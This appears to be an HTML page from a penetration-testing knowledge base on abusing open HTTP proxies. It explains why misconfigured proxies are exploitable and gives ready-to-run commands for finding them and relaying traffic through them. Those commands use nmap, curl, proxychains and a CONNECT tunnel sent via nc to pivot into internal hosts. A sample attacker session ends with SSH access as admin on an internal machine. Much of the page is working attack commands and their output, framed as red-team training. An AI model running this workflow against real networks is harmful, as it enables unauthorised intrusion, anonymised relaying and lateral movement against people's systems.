<!-- Title -->
<h1 class="text-2xl font-bold mb-2">HTTP Proxy Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Web & Network Security</strong> • Focus: <strong>Proxy Abuse & Pivoting</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    HTTP proxies (forward or transparent) mediate traffic between clients and servers. 
    Misconfigured or open proxies allow attackers to relay requests, bypass access controls, 
    and pivot into internal networks. Exploitation enables hiding attacker origin, 
    conducting internal scans, abusing CONNECT tunneling, and credential interception. 
    Exposed proxies are also abused in botnets and spam campaigns.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Open Access:</strong> Many proxies accept unauthenticated external connections.</li>
    <li><strong>Pivoting:</strong> Internal hosts reachable via proxy bypass perimeter defenses.</li>
    <li><strong>Tunneling:</strong> CONNECT method allows arbitrary TCP tunneling (SSH, RDP, SMB).</li>
    <li><strong>Credential Interception:</strong> Plain HTTP creds/logins pass through proxies.</li>
    <li><strong>Botnet Abuse:</strong> Open proxies are enlisted in spam/DoS infrastructures.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify proxy services on ports (3128, 8080, 8000, 1080).</li>
    <li><strong>Abuse Relay:</strong> Use proxy to issue requests (HTTP/S, internal apps).</li>
    <li><strong>Tunneling:</strong> Abuse CONNECT method to establish raw TCP tunnels.</li>
    <li><strong>Pivot:</strong> Leverage proxy to scan and exploit internal network targets.</li>
    <li><strong>Impact:</strong> Anonymity, data theft, lateral movement, and persistence.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan for exposed proxy services.</li>
    <li>Test proxy with curl, proxychains, or nmap NSE.</li>
    <li>Relay web requests via proxy to verify open access.</li>
    <li>Abuse CONNECT tunneling for SSH/RDP/SMB pivoting.</li>
    <li>Enumerate internal network services and exploit reachable hosts.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -p 3128,8080,8000,1080 [target] -sV
nmap --script http-open-proxy [target]

# ------------------------------
# Testing Proxy Access
# ------------------------------
curl -x http://[IP]:3128 http://example.com
curl -x socks5://[IP]:1080 http://ifconfig.me

# ------------------------------
# Using Proxychains
# ------------------------------
proxychains nmap -sT -Pn 10.0.0.0/24 -p 80     # Scan internal via proxy
proxychains ssh user@10.0.0.5                  # Pivot SSH over proxy

# ------------------------------
# CONNECT Tunneling Abuse
# ------------------------------
printf "CONNECT 10.0.0.5:22 HTTP/1.1\r\n\r\n" | nc [IP] 3128
# If successful, attacker can tunnel SSH/RDP/SMB through proxy

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p 3128 192.168.1.50 -sV
curl -x http://192.168.1.50:3128 http://ifconfig.me
proxychains nmap -sT -Pn -p445 10.0.0.10
proxychains smbclient -L 10.0.0.10 -U ""
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p 3128 192.168.1.50 -sV
PORT     STATE SERVICE VERSION
3128/tcp open  http-proxy Squid http proxy 4.15

[ saide ~ ]$ curl -x http://192.168.1.50:3128 http://ifconfig.me
192.168.1.50   <-- Proxy IP shown, attacker origin hidden

[ saide ~ ]$ proxychains nmap -sT -Pn 10.0.0.0/24 -p 445
|_ Discovered internal SMB share at 10.0.0.10:445

[ saide ~ ]$ printf "CONNECT 10.0.0.5:22 HTTP/1.1\r\n\r\n" | nc 192.168.1.50 3128
HTTP/1.0 200 Connection established

[ saide ~ ]$ proxychains ssh admin@10.0.0.5
admin@10.0.0.5's password:
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15 x86_64)

[ saide ~ ]$ whoami
admin
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample HTTP Proxy exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Proxy Test
curl -x http://192.168.1.50:3128 http://ifconfig.me
Result: 192.168.1.50 (proxy IP, attacker origin hidden)

# Internal Enumeration
proxychains nmap -sT -Pn -p 445 10.0.0.10
Result: SMB service discovered on internal host

# CONNECT Tunnel
CONNECT 10.0.0.5:22 via proxy
Status: 200 Connection established
Pivot achieved → SSH access to internal system

# Proof of Exploitation
ssh admin@10.0.0.5 via proxy
whoami → admin
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-proxy" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting Proxies
      </a>
    </li>
    <li>
      <a href="https://attack.mitre.org/techniques/T1090/" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        MITRE ATT&CK – Proxy Abuse (T1090)
      </a>
    </li>
    <li>Red Team workflow: Discover open proxy → Test relay → Abuse CONNECT → Pivot internal network.</li>
  </ul>
</section>
